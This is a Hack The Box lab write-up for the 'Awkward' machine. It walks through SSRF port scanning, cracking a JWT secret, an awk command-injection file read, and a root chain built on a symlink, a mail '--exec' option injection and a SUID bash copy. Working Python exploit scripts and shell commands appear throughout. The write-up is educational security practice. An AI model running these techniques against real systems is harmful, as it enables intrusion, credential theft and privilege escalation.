---
title: "Awkward — SSRF, JWT Forgery, and a Store Cart to Root"
date: 2026-09-08
draft: true
tier: offensive-deep
summary: "An exposed staff API gets us into HR, SSRF reveals an awk injection, and a home backup gives us SSH. Root takes a symlink through the store cart and an injected mail option."
categories:
  - Offensive
tags:
  - Awkward
  - Hack The Box
  - Linux
  - SSRF
  - JWT
  - Command Injection
ShowToc: true
TocOpen: false
---

## Overview

**Box:** Awkward (Hack The Box) · **OS:** Linux · **Difficulty:** Medium

Quite a bit going on with this box. We start with a hat company website, find an employee portal through the JavaScript, and get past an API's authentication by removing a cookie. That gives us credentials for HR. From there, a store status check reaches an internal API documentation page, which gives us enough information to forge a JWT and read files through an `awk` command.

A backup of bean's home directory gets us SSH. Root takes another chain through the store application, a symlink, and a username reaching `mail` as an option.

I used a hint and a writeup during this solve, and followed the privilege escalation walkthrough step for step. Claude also helped with the concurrent SSRF scanner. This account is based on my June notes; the commands below are cleaned up for readability, not a complete terminal transcript or a fresh replay of the box.

## Recon

### The storefront and the JavaScript

My scan notes record port 80, serving `hat-valley.htb`. After adding the hostname to `/etc/hosts`, there wasn't much to follow on the page itself. Directory and virtual host enumeration found `store.hat-valley.htb`, but that wanted HTTP Basic authentication. `admin:admin` and the SQL injection attempts didn't get us through.

The hint pointed us toward the JavaScript. I downloaded the files, beautified them, and tried grepping for endpoints. My next heading in the notes was literally “That was not the right move.”

Let's look in DevTools instead. The exposed source maps let the debugger show the Vue application's source tree under `webpack`. In `src/router/router.js`, we could see `/hr`, `/dashboard`, and `/leave`. The last two had `requiresAuth: true`; `/hr` was another login page.

The useful lead was in `src/services/staff.js`: `/api/staff-details`.

### Remove the cookie

Requesting that endpoint gave us a malformed JWT error. Burp showed a guest value in the token cookie. I tried building a token with a guessed structure, which changed the error to an invalid signature. We still didn't know the signing secret, so that wasn't getting us anywhere.

Removing the entire `Cookie` header returned the staff records, including password hashes.

```http
GET /api/staff-details HTTP/1.1
Host: hat-valley.htb

```

That's the behavior we need here: the request without a cookie disclosed the records. My notes don't preserve the complete authentication handler, so I'm not reproducing an exact guard implementation.

Hashcat didn't identify the password format automatically; it offered several choices. After working through that, we got a hit for `christopher.jones`:

```text
e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
```

Those credentials failed against SSH and the store, but worked at `/hr`. Now we had leave requests and a store status widget to look at.

## Foothold

### A status check into localhost

Clicking refresh sent a request to `/api/store-status` with the store URL in a `url` parameter. Maybe SSRF? Changing it to `http://localhost` returned the main Hat Valley HTML. We also pointed it at an HTTP server on our own box and saw the incoming request.

Let's see what else localhost is hosting.

I started with a serial Python scan, then used Claude's help to make it concurrent. The response filter mattered more than the speedup: an invalid target could return HTTP 200 with an empty body. The earlier filtering missed port 3002. Keeping non-empty responses surfaced it.

This is the scanner from the notes with the stale comment removed:

```python
import requests
from concurrent.futures import ThreadPoolExecutor


def scan(port):
    try:
        response = requests.get(
            f"http://hat-valley.htb/api/store-status?url=http://localhost:{port}",
            timeout=5,
        )
        if len(response.text) > 0:
            print(f"[+] Port {port}: {response.text[:120]}")
    except requests.RequestException:
        pass


with ThreadPoolExecutor(max_workers=50) as pool:
    pool.map(scan, range(1, 65536))
```

The interesting responses were on 80, 3002, and 8080. A non-empty body was a reason to inspect a result, not proof of what service was behind it. Rendering the response from 3002 in Burp revealed API documentation with implementation details.

### The JWT username reaches awk

The internal page exposed this fragment from `/api/all-leave`:

```javascript
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr)
```

That is an excerpt, ending at the callback parameters. The part we care about is `user` being inserted into the shell command. Node's `exec()` runs a command through a shell, so the surrounding quotes are part of what we can interfere with. [Node.js documentation](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback).

The user value came from the JWT. We needed a token with our own username and a signature the server would accept. The session used HS256, so we saved the token from the HR session as `token.txt` and tried the wordlist:

```bash
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

This command uses the uncompressed wordlist path. The secret recovered in the solve was `123beany123`.

We tried getting command execution working, but those attempts failed. I suspected restricted characters or sanitization somewhere. The notes don't establish the exact cause. File reading worked with this username:

```text
/' /etc/passwd '/dud
```

Substituting it into the captured command gives:

```bash
awk '//' /etc/passwd '/dud/' /var/www/private/leave_requests.csv
```

The empty regular expression matches every record. `/etc/passwd` has become an input file; the quoted `/dud/` is another file argument, not a second awk program. A later file error doesn't undo output already produced for `/etc/passwd`. The empty-regexp behavior is documented in the [GNU awk manual](https://www.gnu.org/s/gawk/manual/gawk.html#Regexp-Operator-Details).

### Reading bean's files

The first script printed the response. We later added a binary output option to retrieve a backup. Here is that combined version, named `read_file.py` consistently below. It uses `requests` and `PyJWT`, and retains the token claims recorded in the notes.

```python
#!/usr/bin/env python3
import sys

import jwt
import requests

SECRET = "123beany123"
TARGET = "http://hat-valley.htb/api/all-leave"


def read_file(path, outfile=None):
    payload = f"/' {path} '/dud"
    token = jwt.encode(
        {"username": payload, "iat": "1781208275"},
        SECRET,
        algorithm="HS256",
    )
    response = requests.get(TARGET, cookies={"token": token}, timeout=60)
    if outfile:
        with open(outfile, "wb") as output:
            output.write(response.content)
        print(f"[+] wrote {len(response.content)} bytes to {outfile}")
    else:
        print(response.text)


if __name__ == "__main__":
    path = sys.argv[1]
    outfile = sys.argv[2] if len(sys.argv) > 2 else None
    read_file(path, outfile)
```

Reading `/etc/passwd` gave us two users to investigate, bean and christine. Bean's `.bashrc` had a backup alias:

```bash
python3 read_file.py /etc/passwd
python3 read_file.py /home/bean/.bashrc
```

```bash
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

Let's read that script and see where it puts the files.

```bash
python3 read_file.py /home/bean/Documents/backup_home.sh
```

It created a tarball of bean's home directory, excluding `.npm`, `.cache`, and `.vscode`, then packaged that archive with a timestamp in a second tarball. The final path was `/home/bean/Documents/backup/bean_backup_final.tar.gz`.

We needed the response bytes for this, rather than decoded text printed to the terminal. `response.content` avoids Requests' text decoding step; it doesn't guarantee that the server-side file-read path preserves an archive intact. [Requests documentation](https://requests.readthedocs.io/en/latest/user/quickstart/#binary-response-content).

```bash
python3 read_file.py /home/bean/Documents/backup/bean_backup_final.tar.gz bean_backup_final.tar.gz
mkdir bean-backup
cd bean-backup
tar -xvf ../bean_backup_final.tar.gz
tar -xvf bean_backup.tar.gz
cat .config/xpad/content-DS1ZS1
```

The first extraction reported corruption but still left the inner `bean_backup.tar.gz`. Extracting that gave us the home directory contents. I didn't establish why the outer extraction errored, so I wouldn't treat this as a reliable binary download method without checking the result.

Inside the xpad note:

```text
bean.hill:014mrbeanrules!#P
```

Using that password with `ssh bean@hat-valley.htb` got us onto the box and to the user flag.

Wow finally.

## Privilege escalation

I took a break here. The heading in my original notes says “This was a walkthrough 1:1 cuz wow.” The chain below is the one I followed; I was still trying to get the pieces straight afterwards.

### Watch the leave request

With `pspy64` running in the SSH session, we submitted a leave request through HR. Root activity followed, including `notify.sh`, `chown`, and a `mail` command with the employee name in the subject.

That gave us a path to investigate: leave request data reaching a command run by root. My notes call the launcher cron, but don't capture its configuration. They support the observed root activity after a request, not a definite claim about whether a timer or a file watcher started it.

The useful behavior in `mail` was `--exec`, which accepts a mail command. A `!` command can invoke a shell command. That is the mechanism behind the payload we used below. [GNU Mailutils manual](https://mailutils.org/manual/mailutils.html).

### Back into the store

We still had the store's Basic authentication prompt. From the SSH session, we could read its credentials file:

```bash
cat /etc/nginx/conf.d/.htpasswd
```

```text
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

Rather than cracking another hash, we tried bean's password with `admin`. It worked.

Looking through `/var/www/store/cart_actions.php` connected the store to the file write we needed. Bean couldn't write `/var/www/private/leave_requests.csv` directly, but the store running as `www-data` could. Adding an item copied the second line of a product file into a cart file whose name came from the request.

The relevant flow, shown schematically rather than as captured PHP, was:

```text
product-details/<item>.txt, line 2
    -> append to cart/<user>
    -> follow a symlink to /var/www/private/leave_requests.csv
```

We could put a symlink in the cart directory and control the second line of the product file. The store would do the append with its own permissions. The injected option would enter through the file contents, rather than through the request parameters.

### Put the pieces together

The recorded sequence used product `4` and cart name `fakecart`. These commands are formatted from that sequence; I haven't rerun them against a fresh instance. First, from the bean shell, put the payload on the second line of the product file:

```bash
cat > /var/www/store/product-details/4.txt <<'EOF'
***Hat Valley Product***
pwned --exec='!/tmp/executeme.sh'
EOF
```

Create the script that root's mail process will invoke, then point the cart at the leave request file:

```bash
cat > /tmp/executeme.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x /tmp/executeme.sh
ln -s /var/www/private/leave_requests.csv /var/www/store/cart/fakecart
```

In the authenticated store session, intercept an add-to-cart request in Burp and replace its form values with:

```text
action=add_item&item=4&user=fakecart
```

That copies the second line of `4.txt` through `fakecart` into the CSV. When the root notification process handles the injected value, `--exec` becomes a mail option and invokes `/tmp/executeme.sh`.

The resulting `/tmp/rootbash` is the SUID copy created by the script. Starting it with `-p` preserves the elevated privilege:

```bash
/tmp/rootbash -p
```

That finished the recorded chain to root. The indirect write through the store was the part I needed to review a few times: bean supplies the link and product content, `www-data` writes the protected file, and root consumes it later.

## What didn't work

- **Downloading and grepping all the JavaScript:** I spent time working through bundles before switching to the source tree in DevTools. The source maps made the routes and service calls much easier to follow.
- **Guessing a JWT before knowing the secret:** the error changed from malformed token to invalid signature. Removing the cookie entirely was the test that exposed the staff records.
- **Reusing Christopher's credentials everywhere:** they worked for HR, but failed for SSH and the store. Bean's password came from the backup later.
- **Filtering the SSRF scan by the wrong response behavior:** failures could return 200 with an empty body. The adjusted body-length filter surfaced 3002; the earlier version missed it.
- **Going straight for command execution through the JWT:** those attempts failed for a reason I didn't pin down. File reading worked and gave us a useful next step.
- **Expecting a clean backup extraction:** the outer archive errored, but left an inner archive we could extract. Checking what was actually written kept that lead alive.

## Takeaways

The response-length filter is the detail I want to remember from the web side. Before trusting a scan, try a known bad target and look at what failure actually returns. Here, a successful HTTP status wasn't enough to separate the results.

For the root chain, I need more practice watching what an application does after I interact with it. Running `pspy` while submitting leave exposed activity I could then connect to the source. I followed the walkthrough to make that connection on this box; tracing the file contents across those users is the part to practice again.

There were still gaps in my capture, especially the notification launcher and the archive error. Keeping those unresolved is more useful for a revisit than giving them an explanation I didn't verify.
